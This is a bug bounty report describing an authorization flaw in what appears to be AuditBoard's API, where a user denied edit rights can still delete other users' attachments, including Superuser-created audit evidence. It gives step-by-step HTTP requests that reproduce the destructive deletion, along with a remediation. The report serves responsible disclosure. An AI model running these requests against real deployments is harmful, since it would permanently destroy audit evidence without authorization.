# BUG-010 — Attachment deletion bypasses parent-object authorization (org-wide destructive file delete)

## Severity
P3 — Broken Function Level Authorization (integrity)

## Summary
An Owner-role user is correctly DENIED edit permission on a Narrative belonging to another
user (`narrative:action.edit` → 422) and DENIED edit on files attached to it
(`file:action.edit` → 422) — but the SAME user can DELETE those attachments
(`DELETE /api/v1/files/{id}` → 200). The delete grant is org-wide: it also applies to files
created by user id 1 (Superuser). Deleted attachments are soft-deleted and have no API
restore path (subsequent GET → 410; PUT → 410 `ModelAlreadyDestroyedError`).

Attachment deletion therefore sits outside the parent object's edit boundary: a user who
cannot rename a narrative can permanently destroy the audit evidence attached to it.

## Steps to reproduce

1. As an Owner-role user (user 230), verify you cannot edit the target narrative
   (scoped owner: user 65):

```
PUT /api/v1/narratives/31
token: 230:<token>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
X-Auditboard-Module: account
Content-Type: application/json

{"narrative":{"name":"t031 probe"}}
```
→ **422** `ModelActionPermissionDenied (Permission: narrative:action.edit)`

2. Verify you cannot rename a file attached to it (file created by user 231):

```
PUT /api/v1/files/2660
token: 230:<token>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
X-Auditboard-Module: account
Content-Type: application/json

{"file":{"name":"t031_xu_marker.pdf"}}
```
→ **422** `ModelActionPermissionDenied (Permission: file:action.edit)`

3. Delete a different attachment of the same narrative, created by another user:

```
DELETE /api/v1/files/2661
token: 230:<token>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
X-Auditboard-Module: account
```
→ **200** (soft delete; response contains a `global_audit` entry)

4. Confirm the attachment is gone and unrestorable:

```
GET /api/v1/files/2661
token: 230:<token>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
X-Auditboard-Module: account
```
→ **410** `ModelAlreadyDestroyedError` ("has already been deleted")

5. Scope proof — the same delete grant exists on Superuser-created evidence:

```
GET /api/v1/files/1247
token: 230:<token>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
X-Auditboard-Module: account
```
→ **200** `Fixed Asset Flowchart.vsdx`, `creator_user_id: 1`,
`_permissions: {"action.delete": true, "action.view": true}`

## Impact
- A user with **no edit rights** on SOX audit content (narratives/flowcharts) can
  **permanently remove audit evidence** (attachments) from those objects.
- The grant is **not scoped to the attacker's own uploads** — it applies to files created
  by any user, including the Superuser (2016-era flowchart files observed).
- The action is logged (global_audit) but **not prevented**, and the API offers **no
  restore path** for the soft-deleted attachment.

## Remediation
Gate `file:action.delete` on the parent object's edit authorization (or file ownership),
and add an API/UI restore path for soft-deleted attachments.

## Notes for triage
- Tested in AuditBoard QE staging with two authorized tester accounts (230 = actor, 231 =
  file owner). The deleted file 2661 was our own test artifact (uploaded by our victim
  account in an earlier session); no business data was deleted during testing.
- Read permissions remain correctly gated; this report concerns the delete path only.
